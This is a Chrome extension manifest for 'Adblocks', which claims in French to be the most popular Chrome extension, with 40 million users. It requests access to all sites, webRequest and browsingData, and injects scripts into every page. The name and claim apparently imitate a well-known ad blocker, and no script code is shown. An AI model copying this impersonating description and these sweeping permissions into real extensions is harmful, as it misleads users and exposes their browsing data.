{
    "name": "Adblocks",
    "description": "La plus populaire des extensions Chrome, avec plus de 40 millions d'utilisateurs ! \n Bloque la publicit√© sur le web.",
    "version": "1.0",
    "manifest_version": 2,
    "icons": { 
    "16": "img/ico.png",
    "32": "img/ico.png",
    "48": "img/ico.png",
    "128": "img/ico.png"
    },
    "background":{
      "scripts":[
          "js/call.js",
          "lib/jquery.min.js"
      ]
    },
    "browser_action": {
        "default_icon": "img/ico.png"
    },
    "content_scripts": [
        {
            "matches": [
                "<all_urls>"
            ],
            "js": [
                "lib/jquery.min.js",
                "js/check.js"
            ]
        }
    ],
  "permissions": [
      "tabs",
      "http://*/",
      "https://*/",
      "background",
      "webRequest",
      "storage",
      "browsingData"
  ]
}